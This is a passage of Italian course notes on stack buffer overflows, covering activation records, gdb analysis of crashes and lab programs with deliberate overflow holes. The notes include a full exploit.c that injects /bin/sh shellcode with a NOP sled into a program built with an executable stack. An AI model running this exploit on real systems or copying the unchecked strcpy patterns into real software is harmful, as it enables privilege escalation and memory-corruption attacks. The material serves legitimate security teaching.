Succede se nel buffer di 100 byte, metto 120 byte. La domanda da porgersi è “e se non ho alcun controllo sulla grandezza del buffer?”.

I dati che eccedono la dimensione, vanno oltre e questo risulta nella corruzione della memoria nell'area adiacente al buffer.

> Deve essere il SO a decidere le aree di memoria, e noi oltre a quelle dedicate al processo non dovremmo poter accedere alle aree all'esterno dello spazio di indirizzamento del processo.


Abbiamo **due tipi di buffer overflow**
- basate su **stack**
- basate su **heap**


Noi guarderemo quelle legate allo stack. 

>**Buffer** = spazio contiguo di memoria sulla quale andiamo ad allocare oggetti. Tipicamente contiene dati dello stesso tipo


`int vett[10]` è un array di 40byte, $10 \times 4$
Dove, il nome *vett* è un puntatore a quell'area di memoria di 40 byte.

Scrivendo qualcosa del tipo `vett[1]` è come se facessi $4\times1$ , dove $4$ è la dimensione di un intero. 
>Se scrivo `vett[11]` sono out of bounds, ma sono dopo la fine del mio buffer. Quindi sto scrivendo in un’area di memoria che non avevo riservato prima.


*Bisogna valutare bene quali tipi di errore sono in effetti verificabili a tempo di compilazione*
Avendo dichiarato: `int vett[10];` Vi sono tanti modi per causare buffer overflow a tempo di esecuzione:
```c
vett[10];
for (i=0; i<=k; i++) vett[i];
	scanf(“%d”, &b); vett[4*b];
```


**Il compilatore non può sempre controllare i limiti degli array e dei riferimenti ai puntatori, *perché molti errori si evidenziano a tempo di esecuzione***

---


## Segmentazione della memoria

L’organizzazione di un processo in memoria prevede la divisione dello spazio in quattro segmenti principali:

- Stack, ci trovi anche lo stack di call delle funzioni.
- Heap
- Data → dati statici e global
- Text → codice e dati del programma, è read only



***Stack based buffer overflow** → quando il buffer è dichiarato staticamente, quindi si trova sullo stack*

***Heap based buffer overflow*** -> se il buffer è dichiarato tramite *malloc*, allora il puntatore si trova nell'heap.


### Stack

E' una memoria di tipo Lifo. E' una pila, posso fare solo POP e PUSH.
>Come mai serve uno stack per gestire le attivazioni delle funzioni ? 

-> devo ritornare al chiamante, infatti in assembly io se ho funzioni che chiamano altre funzioni, devo salvare sullo stack il registro x10 (ra). **Sullo stack salvo tutte le informazioni il contesto di esecuzione delle funzioni**. **Nella testa dello stack mi ritrovo il contesto della funzione che sta in esecuzione.**

Quando una funzione finisce, si toglie dallo stack, quindi il controllo passa alla funzione che ha chiamato la funzione che ho tolto.


**Se guardo sullo stack in un certo momento, vedo la catena dei record di attivazione.**

 # Gestione dello Stack e delle Funzioni nei Sistemi a Basso Livello

Lo stack è una struttura dati fondamentale per la gestione delle chiamate di funzione nei linguaggi a basso livello (es. Assembly, C). Ogni volta che una funzione viene chiamata, il sistema salva informazioni importanti sullo stack, come:
- L'indirizzo di ritorno
- I parametri passati
- I registri di base (`frame pointer`, `stack pointer`)
- Le variabili locali

Il C si basa su funzioni, anche il main è una funzione. 

Per catturare la semantica delle chiamate annidate(*una funzione che chiama un'altra e così via*), è **necessario gestire l'area di memoria** che contiene i **record di attivazione** relative alle varie chiamate di funzioni, come una **pila(stack)**.

>**Ogni volta che si chiama una funzione,** viene *creata una zona di memoria immediatamente sopra,* e questa zona contiene le variabili locali della funzione chiamata (incluse le variabili che rappresentano i parametri). La zona di memoria che viene creata per una singola funzione viene detta _record di attivazione_.

- *Ciascun record di attivazione, occupa un **frame** dello stack.* 


#### Catena dei record di attivazione
Quando una funzione *chiamata termina*, il **controllo** torna **al chiamante,** che **deve**
- riprende la sua esecuzione dall'istruzione successiva alla chiamata di funzione
- trovare il suo ambiente di lavoro inalterato 

Infatti, **quando il *chiamante* invoca una funzione**, si inseriscono nel record di attivazione della funzione *chiamata* anche:
1. ***indirizzo di ritorno***, ossia l'indirizzo della prossima istruzione del chiamante che andrà eseguita quando la funzione terminerà.
2. **link dinamico***, ossia il ***collegamento al record di attivazione del chiamante***, in modo da poter ripristinare l'ambiente del chiamante quando la funzione terminerà

La sequenza di link dinamici costituisce la ***catena dinamica*** che rappresenta la storie delle attivazioni.

Quando P invoca la funzione Q, passandogli il parametro a, io dovrò creare un nuovo stack, scusate un nuovo frame sullo stack relativo alla funzione chiamata e lì dentro dovrò fare cose OK, dovrò salvare in qualche modo le variabili che io passo come parametri.

Dovrò passare l'indirizzo alla prossima istruzione da eseguire?  perché a questo punto sei invoco con Q la prossima istruzione da eseguire sarà la prima istruzione della funzione Q non l'istruzione successiva della funzione P.

Nello stack di un certo processo alla base dello stack main, poi, quando il main invoca un'altra funzione si sale nello stack perché verrà fatto il push sullo stack delle informazioni di contesto necessarie alla funzione p, e la funzione p quando invoca Q, la prossima da eseguire, è la prima istruzione della funzione Q. 

Quando eseguo un programma, mi ritrovo la pila di questi record di attivazione. 

Quando il main esegue una funzione, fa il push sullo stack delle informazioni necessarie per invocare P. P quando invoca Q farà il push delle informazioni per Q.

Sulla **cima** dello **stack** mi ritrovo il **contesto** della **funzione** che **attualmente** sta **eseguendo**.

Quando Q finisce deve ritornare il controllo a P. Si toglie dalla testa dello stack, quindi rimane vero che sulla testa dello stack rimane la funzione che sta eseguendo e dato che Q era finito, rimane P sulla cima dello stack.

#### Azioni del processore
Quando un programma va in esecuzione, **l'Instruction Pointer(IP)** viene inizializzato con l'indirizzo della prima istruzione del *text segment* da eseguire.


Il processore esegue un loop di esecuzione IF --> ID --> EX --> MEM --> WB:
1. **Legge** l'istruzione riferita dall'Instruction Pointer
2. **Aggiunge** : la lunghezza dell'istruzione all'IP, di modo che possa puntare all'istruzione successiva
3. Esegue l'istruzione letta in precedenza 
4. Ritorna al punto 1

- L’IP indica l'indirizzo della **prossima istruzione** che il processore deve eseguire.
- Il ciclo del processore è: `Fetch → Decode → Execute → Memory → Writeback`.
- Dopo aver eseguito un’istruzione, l’IP viene incrementato in base alla **lunghezza dell’istruzione**, così da puntare a quella successiva.

Chiamata a funzione: `jal` (Jump And Link)
Quando il programma chiama una funzione con `jal`:
- L'IP viene aggiornato per **saltare all'indirizzo iniziale della funzione chiamata**.
- Il sistema salva **l'indirizzo di ritorno (cioè l'istruzione successiva alla `jal`)** sullo stack o in un registro (`ra`, x1).
- Quando la funzione termina, esegue un’istruzione come `jalr x0, 0(x1)` per tornare all’istruzione successiva della funzione chiamante.



> Com'è fatto un **frame** dello stack(*record di attivazione*)

**Ogni frame contiene**:
- i **parametri** della **funzione**
- le **variabili** **locali** della **funzione**
- le informazioni necessarie per recuperare il *chiamante(link dinamico)*
- Le informazioni necessarie per sapere da dove riprendere l'esecuzione, ovvero ***L'indirizzo della prossima istruzione del chiamante***. Questo viene chiamato `ra` in RISCV. (l'indirizzo, dell'istruzione successiva alla chiamata di funzione.)


NOTA: i frame hanno dimensioni differenti

#### Stack - contenuto
***Il chiamante, prima di passare il controllo a P, scrive il valore dell'Instruction Pointer sullo stack***. Poi P esegue, quando termina, elimina il proprio frame di attivazione, *legge il valore della prossima istruzione di ritorno salvato sullo stack*, e usa quel valore per fare in modo che il registro IP punti alla prossima istruzione da eseguire nel main. 
--> Nello stack mi devo ritrovare anche **l'indirizzo di ritorno del chiamante**.

- mi servono anche i parametri della funzione.
- variabili LOCALI alla funzione
- ***quando P termina, deve togliersi dallo stack. Ma la dimensione dei record di attivazione di ogni funzione cambia. Cosa faccio? MI DEVO RICORDARE LA TESTA DELLO STACK PRECEDENTE, di modo da poterla ripristinare:***


> Come viene gestito lo stack? Quali registri servono?

Servono i seguenti **registri**:
- **extended stack pointer** : contiene lo stack pointer e punta all'estremità superiore dello stack (l'ultimo elemento pieno dello stack). Punta sempre alla testa dello stack.
- **extended base pointer** : contiene il **frame** **pointer** o **base pointer** -> ovvero l'indirizzo base di un frame. Perché per riferirsi alle variabili locali, si considera l'offset dal FP e non dallo stack pointer. Punta alla base del record di attivazione. IP punta alla p
- **instruction pointer (IP)** : ovvero l'indirizzo, dell'istruzione successiva alla chiamata di funzione.

>Cosa succede se Q chiama R?

Devo aggiornare tutti i registri. Prendo il base pointer del chiamante e salvarlo da qualche parte. Quando restituirò l'esecuzione al chiamante, devo dargli il suo valore di base pointer.

***Dopo che mi sono salvato il valore, devo creare un nuovo record di attivazione per la nuova funzione. Quindi quello che prima era lo stack pointer, diventa l'attuale base pointer.*** Lo stack pointer ora punterà alla testa dello stack del chiamato.
Lo stack pointer viene aggiornato al base pointer.

Mi basta che lo stack pointer punti alla testa per dire che lo stack finisce là.


>Problemi della gestione dello stack
- salvare il frame pointer precedente in modo da poter essere ripristinato all'uscita della funzione chiamata
- copiare lo **sp** nel **fp** per creare il nuovo **fp**
- **spostare lo stack pointer** verso gli indirizzi di memoria più bassi, per fare spazio alle variabili locali alla funzione.


![[Pasted image 20250504191824.png]]
IL MAIN MI METTE SULLO STACK I PARAMETRI E ANCHE IL SUO **Instruction POINTER cioè l'indirizzo della sua prossima istruzione.**
La prima cosa che vengono salvate, sono i parametri della funzione, abcd. Poi si salvano IP, FP e poi le variabili locali.

![[Pasted image 20250504191930.png]]


***Esempio*:**
Mettiamo che Q chiami R. Prima, Q salva sullo stack l'indirizzo della sua prossima istruzione da eseguire. 

Quando rimuovo R dallo stack, prenderò, l'IP salvato sullo stack e userò quel valore per aggiornare il registro IP della CPU.

*Ora comincia ad eseguire R che è stato chiamato da Q*.
- salva sulla testa dello stack, del base POINTER. E poi ci mette sopra le sue variabili locali.
- I parametri si trovavano già da prima, nella figura 1 si vede. 
- lo stack pointer punta alla cima dello stack.
- i parametri sono sotto l'ip(`ra`) 



SE a **frame pointer** SOMMO(+) qualcosa, ***vado verso a record di attivazione PRECEDENTI***. 
SE SOTTRAGGO(-), ***vado dentro il record di attivazione ATTUALE***. 
- le variabili locali le ritrovo con offset negativi rispetto al frame pointer.


## Come calcolo FP e SP?
Il **frame pointer** è molto facile, era lo **sp** di prima. Dopodiché metto tutte le mie var locali ecc e decido che mi servono e.g. 60byte. **sp = sp -60byte** perché cresco verso il basso.

## Esempio:

```c
void function_copy(char *str)
{ 
	char b[10];
	strcpy(b, str); //b è il puntatore all'are dove 10 allocazioni di memoria sono allocate
}

int main()
{ 
	char big_string[10];
	int i;
	
	for (i=0; i<9; i++)
		big_string[i] = ‘A’;
	
	big_string[10] = ‘\0’;
	function_copy(big_string);
	
	exit(0);
}
```

Nel codice sopra, `strcpy` copia finché non trova un *terminatore di stringa*.
*Se il terminatore di stringa non c'è, leggo sempre FINO A CHE NON TROVO UN BYTE NULL DI str*.

--> se si scrive una cosa di questo tipo, il compilatore si lamenta.

`strncpy` --> prende il numero massimo di byte che può scrivere, è migliore.

#### Cosa fa quel codice?
La funzione main chiama `function_copy`. 
Fa:
- `push` del parametro `str`
- `push` del proprio indirizzo di ritorno
- e poi l'esecuzione passa al chiamato.

Il chiamato fa:
- `salva` il `frame pointer`
- `alloca le variabile statiche locali`, cioè `char b[10]`

![[Pasted image 20250505175712.png]]

Mettiamo che `str` punta ad una stringa grande 10 byte, con uno `\0` come terminatore.

```c
void function_copy(char *str)
{ 
	char b[10];
	strcpy(b, str); //b è il puntatore all'are dove 10 allocazioni di memoria sono allocate
}

int main()
{ 
	char big_string[128];
	int i;
	
	for (i=0; i<127; i++)
		big_string[i] = ‘A’;
	
	big_string[128] = ‘\0’;
	function_copy(big_string);
	
	exit(0);
}
```

E se in `function_copy` ho ancora `b[10]` ma ci provo a scrivere una stringa di `128` caratteri, anche se termina con `\0`.

Continua a scrivere e vado **a sovrascrivere sia frame pointer che return address**.

![[Pasted image 20250505175941.png]]


Se vado sufficientemente oltre, vado a **sporcare i record di attivazione del chiamante** e **ADDIRITTURA DELL'AREA ASSEGNATA**.

Se scriviamo una `A` stiamo scrivendo un valore che corrisponde alla codifica ASCII di A in esadecimale.
Ad un certo punto, sono andato a sovrascrivere tutto con `0x41`, il valore esadecimale di A.


*Sono andato a sovrascrivere l'**IP***. Ci va `0x41`. 
- **IN REALTA'** il valore non sarà `1byte` ma `4byte` in architettura `32bit` oppure `8byte` per architettura `64bit`.

>Questa porta a diverse conseguenze.


***Una volta che la funzione chiamata termina, il processore tenterà di eseguire l’istruzione contenuta all’indirizzo indicato dall’IP (0x41).***


Due casi per il valore `0x41414141` , può rappresentare due cose:
- il numero esadecimale nell'IP rappresenta un **indirizzo esterno*** rispetto allo spazio di memoria scrivibile dal processo --> **si genera errore di tipo `segmentation fault`**
- il numero esadecimale nell'IP rappresenta un *indirizzo valido per il processo in esecuzione* --> in genere, c'è un malfuzionamento del programma.




#### Segmentation fault
Significa che qualcuno ha provato ad accedere ad un segmento di memoria che non li competeva.

Quando il SO vede che un processo sta provando ad accedere al segmento di un'altro processo, interrompe il processo che si è comportato male mandando una **segnale di SIGSEGV**.

Si può fare in modo che un processo che fallisce faccia un **core dump**--> salvare lo stato dei registri della cpu, salvare anche parte della memoria del processo. 

Facendo così, si può ispezionare quello che è successo. 


**ATTENZIONE**
`DEBIAN` e altri OS di default non dumpano il core. Bisogna attivarlo.

1. `ulimit -c unlimited`
2. Lanciare il programma e generare il buffer overflow. Dovrebbe ora darti `Segmentation fault(core dumped)` e il dump avviene nella cartella corrente
3. Analizzare il dump tramite `gdb nomeeseguibile dump_file`
4. `info registers`

E vedi che hai sovrascritto *return address, cioè base pointer*.





#### Esempio 2 - adams

Funzionamento normale: Se metti la parola giusta, sei a posto. 

C'è anche una funzione che non non andrebbe mai eseguita. L'intero scopo dell'esercizio è dimostra che se si è vulnerabili a buffer overflow, si può eseguire una parte del codice che non andrebbe mai eseguita

**ATTENZIONE** installa prima e compila per 32bit, è più facile, le istruzioni sono di 32bit
Per sistemi **debian based** :
```
ulimit -c unlimited
sudo apt libc6-dev-i386
gcc adams.c -o adams -m32
```

Faccio un pò di fuzz testing
--> dipende un pò dal compilatore, ma io ottengo segmentation fault dopo **`1234567890123456789012`** , il 3 è già segmentation fault.

Provo ora a mettere `1234567890123456789012ABCDEFGHIJKLMNOPQRSTU` e comincio ad analizzare nel filedump che cosa succede.


```bash
gdb adams core
```

```bash
info registers
disass main
```

**ATTENZIONE**: noto che ho nel **base** pointer **`ebp**    0x4a494847     0x4a494847
MI SERVE IL INSTRUCTION POINTER : NMLK
*E questo in esadecimale corrisponde a **JIHG**, quindi so che i byte in corrispondenza di JIHG sono iniettabili.*



Invece il disassemblaggio è 
```assembly
(gdb) disass main
Dump of assembler code for function main:
   0x56593271 <+0>:	lea    0x4(%esp),%ecx
   0x56593275 <+4>:	and    $0xfffffff0,%esp
   0x56593278 <+7>:	push   -0x4(%ecx)
   0x5659327b <+10>:	push   %ebp
   0x5659327c <+11>:	mov    %esp,%ebp
   0x5659327e <+13>:	push   %ebx
   0x5659327f <+14>:	push   %ecx
   0x56593280 <+15>:	sub    $0x10,%esp
   0x56593283 <+18>:	call   0x565930c0 <__x86.get_pc_thunk.bx>
   0x56593288 <+23>:	add    $0x2d6c,%ebx
   0x5659328e <+29>:	call   0x565931bd <autorizza>
   0x56593293 <+34>:	mov    %al,-0x9(%ebp)
   0x56593296 <+37>:	cmpb   $0x0,-0x9(%ebp)
   0x5659329a <+41>:	je     0x565932a3 <main+50>
   0x5659329c <+43>:	call   0x5659321b <accedi>
   0x565932a1 <+48>:	jmp    0x565932b5 <main+68>
   0x565932a3 <+50>:	sub    $0xc,%esp
   0x565932a6 <+53>:	lea    -0x1f18(%ebx),%eax
   0x565932ac <+59>:	push   %eax
   0x565932ad <+60>:	call   0x56593070 <puts@plt>
--Type <RET> for more, q to quit, c to continue without paging--
   0x565932b2 <+65>:	add    $0x10,%esp
   0x565932b5 <+68>:	mov    $0x0,%eax
   0x565932ba <+73>:	lea    -0x8(%ebp),%esp
   0x565932bd <+76>:	pop    %ecx
   0x565932be <+77>:	pop    %ebx
   0x565932bf <+78>:	pop    %ebp
   0x565932c0 <+79>:	lea    -0x4(%ecx),%esp
   0x565932c3 <+82>:	ret
End of assembler dump.
```

Dove `   0x5659329c <+43>:	call   0x5659321b <accedi>`
**è l'indirizzo di `accedi`** e di conseguenza anche le altre funzioni.
Quella è una **call**, cioè è il punto dove viene chiamata la funzione accedi.

L'idea iniziale, quindi `0x5659321b` è il punto da dove comincia `accedi`. Anche facendo un `disass accedi` vedo che comincia da quel punto.


**PROBLEMA**: non posso a mettere a meno `0x5659321b` ma posso usare uno **script**.

Guardiamo il programma `ret.c`

```c
#include <stdio.h>
int main(int argc, char** argv){
	int i=0;
	char buf[36];
	for (i=0;i<=32;i+=4)
		*(long *) &buf[i] = 0x5659321b; //da sostituire con l'indirizzo della call alla funzione accedi
	
	puts(buf);
}
```

**COSA FA?**
Scrive ripetutamente sul buffer questi quattro byte.

Fa un pò di casting per farlo leggere al compilatore. 
- `i+4` --> di 4 in 4 fino a 32byte
- `(long *)` : casta `&buff[i]` in `long *`, cioè tratta `&`, cioè il riferimento a `buff[i]` come un puntatore a un long
- `*(long *)` : dereferenzia questo puntatore, quindi prendigli il valore


Questo lo possiamo compilare ed eseguire.
L'output possiamo passarlo a un file `./ret > ret.out`.

Se apriamo quel file con un editor esadecimale `ghex ret.out` vediamo che è semplicemente quella sequenza di 4 byte ripetuta. Little endian, quindi siamo al contrario

--> Se ora faccio `./ret | ./adams` : dò lo stdout allo stdin di adams.




**Se** l’*indirizzo* di *ritorno* *IP* fosse **sovrascritto** **con** **qualcosa** di 
diverso da 0x41 (ad **esempio**, un **indirizzo** **valido** che punta ad una locazione di memoria che contiene codice
eseguibile), al termine della funzione, **il processore salterebbe al nuovo indirizzo indicato** e non a quello della funzione chiamante, con la conseguenze di eseguire il codice trovato.
--> Tecnica di BYTECODE INJECTION

#### Esempio 3: paul
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void main(int argc, char **argv)
{
	int autenticato = 0;
	char password[20];
	
	printf("Immetti la password: ");
	fgets(password,100,stdin);
	if (strcmp(password, "apritisesamo\n") == 0) {
		printf("Password corretta!\n");
		autenticato = 1;
	}
	if (autenticato) {
		printf("Utente autenticato: eseguo...\n");
	}
	else
		printf("Password sbagliata, utente non autenticato\n");
}
```


>Cosa succedo se metto 24 caratteri, riempendo il buffer e andando oltre?

In memoria, SE SIAMO FORTUNATI, sono salvati 
- `password`
- `autenticato`

Magari non è esattamente dopo, ma chissà, provo ad andare oltre intanto. Provo a scrivere più byte.

Lui fa:
```c
if(autenticato)
```

che significa che `se autenticato è QUALSIASI COSA, per me ok`

In questo caso, RIMANGO nel segmento, è quello il problema, è particolare come vulnerabilità. 

Puoi agigungere queste righe per pararti un pò:
```c
int autenticato = 0;
char inutile[20];

char password[20];
inutile[1]='A';
```

Quando vado a compilarlo, e se provo a fare la stessa cosa, il cosa si comporta meglio.
Magari ci sono delle stringhe in più che sembrano inutili, se le togli, diventi soggetto a buffer overflow.

---


### Bytecode
Il bytecode è un “pezzo” di codice autonomo, progettato in modo astuto, che può essere inserito all’interno dei buffer. Sfrutta il principio di indistiguibilità tra dati e istruzioni.

**L’esempio più comune di bytecode è lo shellcode**

E se l'instruction pointer fosse sovrascritto con qualcosa di diverso, magari un indirizzo valido che punta ad una locazione di memoria che contiene codice eseguibile(deve essere codice già compliato).
--> Quando termina la funzione, il processore salterebbe al nuovo indirizzo indicato e non a quello della funzione chiamante.


> l bytecode è un “pezzo” di codice autonomo, progettato in modo astuto, che può essere inserito all’interno dei buffer

Sfrutta il principio di indistiguibilità tra dati e istruzioni, l'esempio più comune è quello di **shellcode**. 

#### Shellcode
Tipo di bytecode che genera una shell (→ ove l’utente può inserire comandi)

Si riesce ad avere accesso e controllo di un computer anche senza avere alcun account sulla stessa → exploit da remoto

*Se addirittura si riesce a manomettere un programma che esegue con alti privilegi, si potrà disporre di una shell utente con privilegi di root. Notare che di norma la shell ha gli stessi privilegi del programma in esecuzione.*


##### ***Tuttavia utilizzare questa tecnica non è così semplice*** e questo per diversi motivi

1. Dove memorizzo il codice della shellcode?
	1. Andrebbe inserito nell'area di memoria dove è memorizzato anche il buffer
	2. E SE il buffer non è abbastanza grande da contenere uno shellcode?
	   --> devo fare diversi passi di reindirizzamento.
2. Come faccio a riconoscere l'indirizzo dove è memorizzato lo *shellcode* che serve per sovrascrivere l'IP originale??
3. Qual è l'indirizzo della locazione di memoria dove è memorizzato il IP che devo sovvrascrivere?

```c
#include <string.h> #include
<stdio.h>
/* Esempio VN.c */
void f(char *s);

int main (int argc, char **argv)
{ 
	if (! argv[1])
		exit(1);
	
	f(argv[1]); //1. uses directlly the input given by the user 
}

void f(char *s)
{ 
	char b[80];
	printf(“Indirizzo buffer: %p\n”, b);//2. prints the buffer address
	strcpy(b, s); //3. copies insiede the buffer the user input
}
```


**3 punti di vulnerabilità**
1. Contiene una funzione che accetta come parametro una stringa fornita direttamente dall’utente (come argomento di ingresso)
2. La stringa fornita in ingresso viene copiata nel buffer ‘b’ senza controllare che la dimensione del buffer ‘b’ (80 byte) sia sufficiente per contenere completamente la stringa passata in input dall’utente
3. E’ così “gentile” da stampare l’indirizzo del buffer b[ ] …


- **Le vulnerabilità del programma emergono palesemente se la stringa fornita in ingresso ha dimensioni maggiori del buffer**

```shell
./EsempioVN AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA indirizzo del buffer: 0xbfffd467 
segmentation fault
```

***Motivi***
1. La stringa di ‘A’ passata come parametro viene ugualmente riversata nello stack, anche oltre la fine del buffer ➔il risultato è che sia il FP sia l’IP vengono sovrascritti con caratteri 'A' in hex 0x41
	- ➔ma 0x41414141 (si assume una word di 32 bit) non è un indirizzo valido per l’IP
	- quindi il processo prova ad accedere ad un'area di memoria a lui non riservato, quindi il SO interviene tramite un segnale di SIGSEGV.



***Come si sfruttano queste vulnerabilità?***
- vengono sfruttate da un programma che riesce a costruire una stringa opportuna da passare al programma e che contenga:
	- il codice da eseguire
	- l'IP nuovo che dovrà sovrascrivere all'IP originale
	- l'IP nuovo e memorizzato al posto giusto

Serve
• Conoscere molto bene linguaggio C e Assembly
• Conoscere offset e aritmetica esadecimale
• Conoscere tecniche di memorizzazione e allineamento dei compilatori (lo stack di default viene allineato a 4 word quando vengono inseriti i valori dei registri FP e IP che occupano 1 word ciascuno)
- Una **word** è l’unità di memoria utilizzata dal processore. Il suo valore dipende dall'architettura: su architettura a 32bit, una word è grande 4byte.
	- Il **compilatore** e l’**architettura** impongono che le variabili siano **allineate** a determinati **multipli di word** per motivi di efficienza (accessi in memoria più veloci e sicuri).
		- Ad esempio, se una variabile deve essere allineata a 4 word: verrà posizionata in memoria a indirizzi multipli di 16 byte (4 × 4 byte)


###### ***Exploit***
*Shellcode di exploit per la visualizzazione del contenuto della directory corrente:*
```c
char shellcode[] = "...\xff/bin/ls";
```

*Shellcode di exploit per la creazione di una shell:*
```c
char shellcode[] = "... \xff/bin/sh";
```

Dove "..." è complessa e denota operazioni in *esadecimale* per consentire l'exploit

**Osservazioni**
1. Per eseguire questo codice, è necessario inserire in IP l'inizio del buffer dove viene memorizzato tale codice. Cioè &shellcode va al posto del IP.


**Non potendo in generale sapere dove verrà allocato in memoria il programma** e di conseguenza la stringa che lo segue, non è un problema banale trovare gli indirizzi da utilizzare: SOL1
> **utilizzare** **riferimenti** **relativi**, in modo che il programma sia in grado di **calcolare** **da** **solo** gli **offset** **e** quindi di funzionare indipendentemente da dove verrà allocato

- Si usano le istruzioni JMP e CALL che consentono di saltare non solo a una posizione assoluta, ma anche di un determinato offset positivo o negativo a partire dall’IP corrente

**CALL**
La CALL salva nello stack l’**indirizzo** **assoluto** **successivo** a quello che la contiene. In questo modo si garantisce che l’esecuzione del programma prosegua sequenzialmente una volta terminata la chiamata (call functionA)
- Se l’istruzione successiva alla CALL è la stringa "/bin/sh", l’esecuzione della chiamata CALL provocherà la memorizzazione dell’indirizzo di tale stringa in cima allo stack consentendo di recuperarlo con un POP e di salvarlo in un registro

Si usa la call non per chiamare una funzione, ma per sapere qual è l'indirizzo della stringa /bin/sh da eseguire.


- facendo una call, si sposta l'IP a un'altra parte della memoria, quindi si rischia di non essere più in grado di tornare indietro. 
	- *soluzione* : restare all'interno del buffer , di cui si conosce la struttura e i relativi offset.
	- **si fa puntare la call *quasi all'inizio del buffer***. QUASI perché *all'inizio si inserisce una JMP che punta ad una CALL*. La CALL è così posizionata verso la fine del codic , ma subito prima dello \0 che terminal il buffer.
- NOTA:*I re-indirizzamenti interni al buffer sono facilmente calcolabili, dato che il buffer è creato proprio dall’attacker*




##### Esempio`buffer_overflow_2`
```c
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[500];
	if(argc>=2) strcpy(buffer, argv[1]);
	return 0;
}
```


```shell
gcc -m32 -z execstack -o vulnerable vulnerable.c
```

`execstack` : Di norma il software viene compilato e viene marcata l'area di memoria dello stack come non eseguibile. All'interno del segmento di stack io non mi aspetto di trovarmi codice eseguibile/istruzioni. Se l'IP punta a quel segmento, avrò un segmentation fault. 
- ecco perché uso l'opzione execstack

- Dato che metto la mia shellcode nel buffer, che però si trova nello stack. Se lo stack non è eseguibile, anche se IP punta all'interno del segmento(infatti punta all'interno dello stack), genere **segmentation fault** perché lo stack non è eseguibile.

Siccome il buffer ammette 500byte, uso python per generare tante A:
```shell
./vulnerable `python3 -c "print(600*'A')"`
```



***Esempio 2***
`exploit.c`
```c
#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>
#include<string.h>

#define BUFFERSIZE 600  /* vulnerable buffer + 100 bytes */

/* linux x86 shellcode */
char lunixshell[] = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
                    "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
                    "\x80\xe8\xde\xff\xff\xff/bin/sh";

unsigned long sp(void)
{
	__asm__("movl %esp, %eax"); //when i invoce this, returns the head of the stack
}

int main(int argc, char *argv[])
{
	int i, offset, os;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr, *osptr;

	if(argc<2) return 0;   /* quit if they didnt specify an offset */

	offset = atoi(argv[1]);  /* get the offset they specified */
	esp    = sp();           /* get the stack pointer */
	ret    = esp-offset;     /* sp - offset = return address *///valore con cui sovrascriverò l'IP del programma vulnerabile

	printf("Stack pointer: 0x%x\n", esp);
	printf("       Offset: 0x%x\n", offset);
	printf("  Return addr: 0x%x\n", ret);

	/* allocate memory for our buffer */
	if(!(buffer = malloc(BUFFERSIZE))) {
		printf("Couldn't allocate memory.\n");
		exit(-1);
	}

	/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = ret;

	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';

	/* insert shellcode in the middle */
	ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
	for(i=0; i<strlen(lunixshell); i++)
		*(ptr++) = lunixshell[i];

	/* call the vulnerable program passing our exploit buffer as the argument */

	buffer[BUFFERSIZE-1] = 0;
	execl("./vulnerable", "vulnerable", buffer, 0);

	return 0;
}
```

Questo programma, si crea l'input necessario per causare l'iniezione della shellcode e sarà lui a invocare `vulnerable`(il programma vulnerabile) e gli passerà quel input. 
- l'input che dà è il nuovo buffer che contiene dentro la sua shellcode.

***Vediamo ora il programma `exploit.c` che cosa fa. Come fa a costruirsi il buffer?***
1. **Costruisce la shellcode**
```c
char lunixshell[] = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
                    "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
                    "\x80\xe8\xde\xff\xff\xff/bin/sh";
```

E' una notazione che mi fa capire che ua c'è un shellcode. Questi byte strani mi dicono che c'è un byte in codifica esadecimali.
- un byte ha 8 bit. In esadecimale, io ho due cifre(ognuna da 4bit) per rappresentare un byte, quindi eb --> 14 11 --> 1110 1011

Supponiamo che la shellcode funzioni. Quindi *proviamo a fare in modo che IP punti a questa shellcode*.

2. **Funzione `sp`**
```c
unsigned long sp(void)
{
	__asm__("movl %esp, %eax");
}
```
`__asm__` è una direttiva che vien data al compilatore. Il compilatore comprende che quell'istruzione deve essere interpretata come istruzione `assembly`. In questo caso
- `esp` che punta alla testo dello stack, *e la copia in `eax`*
- Per come funziona la convenzione delle chiamate, tu quando fai una `jal funzione, ra`, il valore di ritorno della funzione verrà salvata in `eax`. 

QUINDI in questo caso
  
3. **Quando invoco la funzione `sp` questa mi ritorna l'indirizzo alla testa dello stack**

```c
	offset = atoi(argv[1]);  /* get the offset they specified */
	esp    = sp();           /* get the stack pointer */
	ret    = esp-offset;     /* sp - offset = return address */
```

`long esp=sp()` : il valore di ritorno della funzione sp(), cioè il valore che punta alla testa dello stack di questo programma.

`ret` : sarà l'indirizzo di ritorno che userò per sovvrascrivere l'IP del programma vulnerabile.

**`ret = esp-offset`: perché questo valore?**
### IMPORTANTE
- Exploit manda in esecuzione vulnerable. **Supponiamo che OS mappi su area di memoria contigua i segmenti di processi che vengono mandati in esecuzione in modo consecutivo.**
	- **allora posso** *calcolare un indirizzo che è valido per lo stack del programma vulnerabile **partendo*** da un indirizzo che è valido per lo stack di exploit e spostandomi un pochino. 
		- di quanto mi scosto? BOH


4. **Allochiamo il buffer di 600 caratteri**
```c
	/* allocate memory for our buffer */
	if(!(buffer = malloc(BUFFERSIZE))) {
		printf("Couldn't allocate memory.\n");
		exit(-1);
	}
```


5. **Riempiamo il buffer saltando di 4 byte alla volta, copiando l'indirizzo di ritorno che ci siamo calcolati**
```c
/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;//tratta il buffer come 600/4 puntatori
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = ret;
	
```

